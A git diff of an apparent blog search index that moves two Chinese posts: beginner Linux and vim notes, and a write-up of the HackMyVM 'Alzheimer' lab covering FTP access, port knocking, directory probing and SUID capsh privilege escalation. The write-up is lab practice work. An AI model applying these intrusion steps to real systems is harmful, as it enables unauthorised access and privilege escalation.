@@ -6,167 +6,6 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>linux基础指令笔记</title>
-    <url>/posts/11168.html</url>
-    <content><![CDATA[<p>linux基础指令学习笔记</p>
-<span id="more"></span>
-<p>⚠️本篇博客只是我刚学习linux指令时的笔记，只用来自己记录</p>
-<h1 id="Linux-系统指令"><a href="#Linux-系统指令" class="headerlink" title="Linux 系统指令"></a>Linux 系统指令</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
-<li><a href="#linux-%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4">Linux 系统指令</a><ul>
-<li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li>
-<li><a href="#%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C">文件基础操作</a><ul>
-<li><a href="#%E6%A0%B8%E5%BF%83%E6%8C%87%E4%BB%A4">核心指令</a><ul>
-<li><a href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86">文件管理</a></li>
-<li><a href="#%E5%86%85%E5%AE%B9%E5%A4%84%E7%90%86">内容处理</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">权限管理</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9">权限修改</a></li>
-</ul>
-</li>
-<li><a href="#shell%E8%84%9A%E6%9C%AC">shell脚本</a></li>
-<li><a href="#vim-%E5%9F%BA%E7%A1%80">vim 基础</a><ul>
-<li><a href="#%E8%BF%9B%E5%85%A5%E9%80%80%E5%87%BA%E7%BC%96%E8%BE%91%E6%A8%A1%E5%BC%8F">进入&#x2F;退出编辑模式</a></li>
-<li><a href="#%E7%A7%BB%E5%8A%A8%E5%85%89%E6%A0%87">移动光标</a></li>
-<li><a href="#%E5%A4%8D%E5%88%B6%E5%89%AA%E5%88%87%E7%B2%98%E8%B4%B4">复制、剪切、粘贴</a></li>
-<li><a href="#%E6%92%A4%E9%94%80--%E6%81%A2%E5%A4%8D">撤销 &amp; 恢复</a></li>
-<li><a href="#%E4%BB%A3%E7%A0%81%E7%BC%A9%E8%BF%9B">代码缩进</a></li>
-<li><a href="#%E7%AA%97%E5%8F%A3--%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86">窗口 &amp; 标签管理</a></li>
-<li><a href="#%E7%AA%97%E5%8F%A3%E5%AF%B9%E9%BD%90">窗口对齐</a></li>
-<li><a href="#vim-%E9%85%8D%E7%BD%AE">Vim 配置</a></li>
-<li><a href="#g%E7%BC%96%E8%AF%91">g++编译</a></li>
-</ul>
-</li>
-<li><a href="#%E6%8F%92%E4%BB%B6%E7%AE%A1%E7%90%86">插件管理</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="文件基础操作"><a href="#文件基础操作" class="headerlink" title="文件基础操作"></a>文件基础操作</h2><h3 id="核心指令"><a href="#核心指令" class="headerlink" title="核心指令"></a>核心指令</h3><h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span>          <span class="comment"># 列出目录内容</span></span><br><span class="line"><span class="built_in">ls</span> -l       <span class="comment"># 长格式显示（包含权限信息）</span></span><br><span class="line"><span class="built_in">ls</span> -a       <span class="comment"># 显示隐藏文件</span></span><br><span class="line"><span class="built_in">cd</span> ~        <span class="comment"># 返回用户目录</span></span><br><span class="line"><span class="built_in">pwd</span>         <span class="comment"># 显示当前路径</span></span><br><span class="line"><span class="built_in">cat</span> file    <span class="comment"># 查看文件内容</span></span><br><span class="line"><span class="built_in">cp</span> src.txt dest/          <span class="comment"># 复制文件</span></span><br><span class="line"><span class="built_in">cp</span> -R <span class="built_in">dir</span>/ dest/          <span class="comment"># 复制目录需要-R参数</span></span><br><span class="line"><span class="built_in">mv</span> old.txt new.txt        <span class="comment"># 重命名文件</span></span><br><span class="line"><span class="built_in">mkdir</span> project             <span class="comment"># 创建目录</span></span><br><span class="line"><span class="built_in">rmdir</span> empty_dir           <span class="comment"># 删除空目录</span></span><br><span class="line"><span class="built_in">rm</span> -rf temp/              <span class="comment">#强制递归删除目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理含空格文件名</span></span><br><span class="line"><span class="built_in">touch</span> <span class="string">&quot;file name.txt&quot;</span>     <span class="comment"># 创建带空格文件</span></span><br><span class="line"><span class="built_in">ls</span> file\ name.txt         <span class="comment"># 转义空格查看</span></span><br></pre></td></tr></table></figure></div>
-<h4 id="内容处理"><a href="#内容处理" class="headerlink" title="内容处理"></a>内容处理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STAN"><figure class="iseeu highlight /stan"><table><tr><td class="code"><pre><span class="line">wc -l access.<span class="built_in">log</span>          <span class="comment"># 统计行数</span></span><br><span class="line">diff file1 file2          <span class="comment"># 文件差异对比</span></span><br><span class="line"><span class="built_in">head</span> -n <span class="number">20</span> <span class="built_in">log</span>.txt        <span class="comment"># 查看前20行</span></span><br><span class="line"><span class="built_in">tail</span> -f service.<span class="built_in">log</span>       <span class="comment"># 实时追踪日志更新</span></span><br><span class="line">grep <span class="string">&quot;error&quot;</span> *.<span class="built_in">log</span>        <span class="comment"># 多文件关键词搜索</span></span><br></pre></td></tr></table></figure></div>
-<h4 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">-rw-r--r-- <span class="number">1</span> <span class="keyword">user</span> <span class="title">group</span> <span class="number">4096</span> Jan <span class="number">1</span> <span class="number">00</span>:<span class="number">00</span> file.txt</span><br><span class="line"><span class="comment"># 第1位：文件类型（-普通文件，d目录）</span></span><br><span class="line"><span class="comment"># 2-4位：用户权限（rw-）</span></span><br><span class="line"><span class="comment"># 5-7位：组权限（r--）</span></span><br><span class="line"><span class="comment"># 8-10位：其他用户权限（r--）</span></span><br></pre></td></tr></table></figure></div>
-<h4 id="权限修改"><a href="#权限修改" class="headerlink" title="权限修改"></a>权限修改</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x script.sh      <span class="comment"># 添加用户执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> go-w secret.txt    <span class="comment"># 移除组和其他写权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 executable     <span class="comment"># 数字模式权限设置（rwxr-xr-x）</span></span><br><span class="line">chomd 600  id_rsa        <span class="comment"># 仅文件所有者可读写，其他人无权限</span></span><br></pre></td></tr></table></figure></div>
-<h3 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Shell 脚本基础示例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量赋值与引用</span></span><br><span class="line">VAR=<span class="string">&quot;Hello World&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;变量内容：<span class="variable">$VAR</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取用户输入</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入你的名字：&quot;</span> name</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你好，<span class="variable">$name</span>！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行参数处理</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;执行脚本名：<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数：<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;参数个数：<span class="variable">$#</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;所有参数：<span class="variable">$@</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 条件判断</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;错误：缺少参数！&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ -d <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span> 是目录&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ -f <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span> 是普通文件&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;未知文件类型&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逻辑判断（&amp;&amp; || 逻辑运算）</span></span><br><span class="line">[ -n <span class="string">&quot;<span class="variable">$name</span>&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;你输入了名字：<span class="variable">$name</span>&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;未输入名字&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环示例</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..5&#125;; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;for 循环：<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 循环</span></span><br><span class="line">count=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$count</span> -le 3 ]; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;while 循环：<span class="variable">$count</span>&quot;</span></span><br><span class="line">    count=$((count + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件（假设 input.txt 存在）</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;input.txt&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;处理内容：<span class="variable">$line</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span> &lt; input.txt</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;文件 input.txt 不存在，跳过读取&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运算表达式</span></span><br><span class="line"><span class="built_in">sum</span>=$((<span class="number">3</span> + <span class="number">5</span>))            <span class="comment"># 整数运算</span></span><br><span class="line">mul=$(<span class="built_in">expr</span> 3 \* 5)        <span class="comment"># expr 计算</span></span><br><span class="line">mod=$(<span class="built_in">expr</span> 10 % 3)        <span class="comment"># 取模运算</span></span><br><span class="line">div=$(<span class="built_in">echo</span> <span class="string">&quot;scale=2; 3/7&quot;</span> | bc)  <span class="comment"># 浮点运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;整数求和：<span class="variable">$sum</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;乘法结果：<span class="variable">$mul</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;取模结果：<span class="variable">$mod</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;浮点除法结果：<span class="variable">$div</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比较符</span></span><br><span class="line">1. 字符比较</span><br><span class="line">- 相等：[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> = <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]</span><br><span class="line">- 不等：[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> != <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]</span><br><span class="line">- 空字符串：[ -z <span class="string">&quot;<span class="variable">$str</span>&quot;</span> ]</span><br><span class="line">- 非空字符串：[ -n <span class="string">&quot;<span class="variable">$str</span>&quot;</span> ]</span><br><span class="line">- 字典顺序比较：[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> \&gt; <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ] 或 [[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]]</span><br><span class="line"></span><br><span class="line">2. 数字比较</span><br><span class="line">- 相等：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -eq <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 不等：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -ne <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 大于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 小于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -lt <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 大于或等于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 小于或等于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -le <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line"></span><br><span class="line">3. 简化数字比较</span><br><span class="line">使用 (( )) 比较数字：</span><br><span class="line">- 相等：(( num1 == num2 ))</span><br><span class="line">- 大于：(( num1 &gt; num2 ))</span><br><span class="line">- 小于：(( num1 &lt; num2 ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数示例</span></span><br><span class="line"><span class="function"><span class="title">greet</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;欢迎，<span class="variable">$1</span>！&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">greet <span class="string">&quot;Shell 学习者&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前日期</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前时间：<span class="subst">$(date <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>)</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<h3 id="vim-基础"><a href="#vim-基础" class="headerlink" title="vim 基础"></a>vim 基础</h3><h4 id="进入-退出编辑模式"><a href="#进入-退出编辑模式" class="headerlink" title="进入&#x2F;退出编辑模式"></a>进入&#x2F;退出编辑模式</h4><ul>
-<li>按 <code>i</code> 进入编辑模式，<code>ESC</code> 退出编辑模式，返回命令模式。  </li>
-<li>在命令模式下：<ul>
-<li><code>:wq</code> <strong>保存并退出</strong>  </li>
-<li><code>:q!</code> <strong>不保存退出</strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h4><ul>
-<li><code>HJKL</code> 在命令模式下分别表示：<ul>
-<li><code>H</code> 左</li>
-<li><code>J</code> 下</li>
-<li><code>K</code> 上</li>
-<li><code>L</code> 右</li>
-</ul>
-</li>
-<li><code>w</code> 按单词向前移动光标，<code>b</code> 反向移动  </li>
-<li><mark>Ctrl + F</mark> (<strong>Foreword</strong>) <strong>向下翻页</strong> (<code>PageDown</code>)  </li>
-<li><mark>Ctrl + B</mark> (<strong>Backwards</strong>) <strong>向上翻页</strong> (<code>PageUp</code>)  </li>
-<li><code>数字 + gg</code> 跳转到指定行  </li>
-<li><code>数字 + j/k</code> 跳转多行  </li>
-<li><code>/关键词</code> 搜索关键字，<code>n</code> 下一个，<code>Shift + N</code> 上一个</li>
-</ul>
-<h4 id="复制、剪切、粘贴"><a href="#复制、剪切、粘贴" class="headerlink" title="复制、剪切、粘贴"></a>复制、剪切、粘贴</h4><ul>
-<li><code>cc</code> <strong>剪切一行</strong>（可加数字，如 <code>c2c</code> 剪切两行）  </li>
-<li><code>yy</code> <strong>复制当前行</strong>  </li>
-<li><code>p</code> <strong>粘贴</strong>  </li>
-<li>在命令模式下：<ul>
-<li><code>:%y</code> <strong>复制整个文件</strong>  </li>
-<li><code>ggVG</code> <strong>选中全部文本</strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="撤销-恢复"><a href="#撤销-恢复" class="headerlink" title="撤销 &amp; 恢复"></a>撤销 &amp; 恢复</h4><ul>
-<li><code>u</code> <strong>撤销</strong>（Undo）  </li>
-<li><code>Ctrl + R</code> <strong>恢复撤销的操作</strong>（Redo）</li>
-</ul>
-<h4 id="代码缩进"><a href="#代码缩进" class="headerlink" title="代码缩进"></a>代码缩进</h4><ul>
-<li><code>v</code> 进入 <strong>可视模式</strong>，选中文本后：<ul>
-<li><code>&lt;</code> <strong>减少缩进</strong>  </li>
-<li><code>&gt;</code> <strong>增加缩进</strong>  </li>
-<li><code>+y</code> <strong>复制选中内容</strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="窗口-标签管理"><a href="#窗口-标签管理" class="headerlink" title="窗口 &amp; 标签管理"></a>窗口 &amp; 标签管理</h4><ul>
-<li><code>:tabnew [文件]</code> <strong>新建标签页</strong>  </li>
-<li><code>:tabc</code> <strong>关闭当前标签</strong>  </li>
-<li><code>:tabo</code> <strong>关闭其他所有标签</strong>  </li>
-<li><code>:tabs</code> <strong>查看所有打开的标签</strong>  </li>
-<li><code>:tabp / :tabn</code> <strong>切换前&#x2F;后一个标签</strong>  </li>
-<li>标准模式下：<ul>
-<li><code>gt</code> <strong>下一个 tab</strong>  </li>
-<li><code>gT</code> <strong>上一个 tab</strong></li>
-</ul>
-</li>
-<li><code>R</code> <strong>刷新 NerdTree</strong></li>
-</ul>
-<h4 id="窗口对齐"><a href="#窗口对齐" class="headerlink" title="窗口对齐"></a>窗口对齐</h4><ul>
-<li><code>zz</code> <strong>让光标所在行位于屏幕中间</strong>  </li>
-<li><code>zt</code> <strong>让光标所在行置顶</strong>  </li>
-<li><code>zb</code> <strong>让光标所在行置底</strong>  </li>
-<li><code>Ctrl + E</code> <strong>向下滚动一行</strong>  </li>
-<li><code>Ctrl + Y</code> <strong>向上滚动一行</strong></li>
-</ul>
-<h4 id="Vim-配置"><a href="#Vim-配置" class="headerlink" title="Vim 配置"></a>Vim 配置</h4><ul>
-<li>在命令模式下输入：<ul>
-<li><code>:syntax on</code> <strong>开启代码高亮</strong>  </li>
-<li><code>:set number</code> <strong>显示行号</strong></li>
-</ul>
-</li>
-<li><strong>全局生效</strong>：编辑 <code>~/.vimrc</code> 文件，添加：<br>syntax on<br>set number</li>
-</ul>
-<h4 id="g-编译"><a href="#g-编译" class="headerlink" title="g++编译"></a>g++编译</h4><p>默认编译： <code>g++ [选项] -o 生成文件名 源文件.cpp</code>  如果不加 -o 选项，默认会生成 a.out<br>使用c++11标准： <code>g++ -std=c++11 file.cpp</code></p>
-<h3 id="插件管理"><a href="#插件管理" class="headerlink" title="插件管理"></a>插件管理</h3><p>安装Vim-Plug（插件管理器）：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.<span class="keyword">vim</span>/autoload/plug.<span class="keyword">vim</span> --create-dirs \</span><br><span class="line">     https://raw.githubusercontent.<span class="keyword">com</span>/junegunn/<span class="keyword">vim</span>-plug/master/plug.<span class="keyword">vim</span></span><br></pre></td></tr></table></figure></div>
-
-<p>安装插件： 在 ~&#x2F;.vimrc 添加</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">call plug<span class="punctuation">#</span><span class="keyword">begin</span><span class="params">(&#x27;~<span class="operator">/</span>.<span class="variable">vim</span><span class="operator">/</span><span class="variable">plugged</span>&#x27;)</span></span><br><span class="line">Plug &#x27;preservim/nerdtree&#x27;</span><br><span class="line">Plug &#x27;junegunn/fzf&#x27;</span><br><span class="line">call plug<span class="punctuation">#</span><span class="keyword">end</span><span class="params">()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<p>插件指令：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:PlugInstall</span>        <span class="comment"># 安装插件（从 ~/.vimrc 配置的源下载并安装插件）</span></span><br><span class="line"><span class="symbol">:PlugUpdate</span>         <span class="comment"># 更新已安装的插件</span></span><br><span class="line"><span class="symbol">:PlugUpgrade</span>        <span class="comment"># 更新 Vim-Plug 本身</span></span><br><span class="line"><span class="symbol">:PlugClean</span>          <span class="comment"># 清理无用的插件（删除未在 ~/.vimrc 配置中的插件）</span></span><br><span class="line"><span class="symbol">:PlugStatus</span>         <span class="comment"># 显示已安装插件的状态</span></span><br><span class="line"><span class="symbol">:PlugDiff</span>           <span class="comment"># 显示本地插件与远程仓库的差异</span></span><br></pre></td></tr></table></figure></div>]]></content>
-      <categories>
-        <category>linux</category>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>操作系统</tag>
-        <tag>shell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HMV-Alzheimer</title>
-    <url>/posts/16384.html</url>
-    <content><![CDATA[<p>HMV-Alzheimer靶场复盘</p>
-<span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
-<h1 id="Alzheimer"><a href="#Alzheimer" class="headerlink" title="Alzheimer"></a>Alzheimer</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p> <img src="https://pic1.imgdb.cn/item/679a400bd0e0a243d4f87a4b.png"><br>三个端口  只有21端口现在是开放的  80和22都是有防火墙<br>先尝试能不能匿名登录ftp  然后上传反弹shell文件<br><img src="https://pic1.imgdb.cn/item/679a4010d0e0a243d4f87a4c.png"><br>发现有一个.secretnote.txt 下载到本地查看<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4d.png"><br>提示我们要用knock服务 按这个顺序发送请求包才能打开端口</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/alz]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">knock</span> <span class="string">-u</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.125</span> <span class="number">1000 </span><span class="number">2000 </span><span class="number">3000</span></span><br></pre></td></tr></table></figure></div>
-<p>但是敲门之后还是无法打开两个端口  查了wp  发现和橘墨大佬的问题一样 因为我修改过网卡，所以去修改靶机的knockd配置文件<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4e.png" alt="|500"><br><code>service knockd restart</code><br><img src="https://pic1.imgdb.cn/item/679a403ed0e0a243d4f87a59.png"><br>修改配置文件之后在knock就可以访问80端口了</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a403fd0e0a243d4f87a5a.png"><br>提示密码存在一个.txt文件中  用户名是 medusa   并且给了一个摩丝密码 nothing<br>现在进行目录扫描<br><img src="https://pic1.imgdb.cn/item/679a4044d0e0a243d4f87a5b.png"><br>这里给了三个重定向的目录 一次访问试试</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/</span></span><br><span class="line">Maybe my password is in this secret folder?</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/home/  </span></span><br><span class="line">Maybe my pass is at home!</span><br><span class="line">-medusa</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/admin/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>403 Forbidden<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span></span><br><span class="line"><span class="variable">&lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="variable">&lt;center&gt;</span><span class="variable">&lt;h1&gt;</span>403 Forbidden<span class="variable">&lt;/h1&gt;</span><span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;hr&gt;</span><span class="variable">&lt;center&gt;</span>nginx/1.14.2<span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>提示密码在secret目录中 又在文件home中所以访问&#x2F;secret&#x2F;home&#x2F;</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/home/</span></span><br><span class="line"></span><br><span class="line">Im trying a lot. Im sure <span class="keyword">that</span> i will recover <span class="keyword">my</span> pass!</span><br><span class="line"></span><br><span class="line">-medusa</span><br></pre></td></tr></table></figure></div>
-<p>还是没有直接的密码<br>没有思路查看wp后才知道密码藏在ftp里面 但是是在knock之后过的ftp中  这个老六。。。<br><img src="https://pic1.imgdb.cn/item/679a4045d0e0a243d4f87a5d.png"><br>这个就是medusa的密码<br><img src="https://pic1.imgdb.cn/item/679a4047d0e0a243d4f87a5e.png"><br>拿到shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a407ed0e0a243d4f87a61.png"><br>发现有sudo命令  但是这个无法提权<br>继续查suid文件<br><img src="https://pic1.imgdb.cn/item/679a4083d0e0a243d4f87a64.png"><br>搜索都可以用capsh提权<br><img src="https://pic1.imgdb.cn/item/679a407fd0e0a243d4f87a62.png"><br><img src="https://pic1.imgdb.cn/item/679a4082d0e0a243d4f87a63.png"><br>拿到flag</p>
-<p>密码存在knock之后的ftp的文件中也太阴险了。。。</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>HMV</tag>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kali工具笔记</title>
     <url>/posts/15173.html</url>
     <content><![CDATA[<p>kali工具笔记</p>
@@ -1438,6 +1277,139 @@
       </tags>
   </entry>
   <entry>
+    <title>linux基础指令笔记</title>
+    <url>/posts/11168.html</url>
+    <content><![CDATA[<p>linux基础指令学习笔记</p>
+<span id="more"></span>
+<p>⚠️本篇博客只是我刚学习linux指令时的笔记，只用来自己记录</p>
+<h1 id="Linux-系统指令"><a href="#Linux-系统指令" class="headerlink" title="Linux 系统指令"></a>Linux 系统指令</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#linux-%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4">Linux 系统指令</a><ul>
+<li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C">文件基础操作</a><ul>
+<li><a href="#%E6%A0%B8%E5%BF%83%E6%8C%87%E4%BB%A4">核心指令</a><ul>
+<li><a href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86">文件管理</a></li>
+<li><a href="#%E5%86%85%E5%AE%B9%E5%A4%84%E7%90%86">内容处理</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">权限管理</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9">权限修改</a></li>
+</ul>
+</li>
+<li><a href="#shell%E8%84%9A%E6%9C%AC">shell脚本</a></li>
+<li><a href="#vim-%E5%9F%BA%E7%A1%80">vim 基础</a><ul>
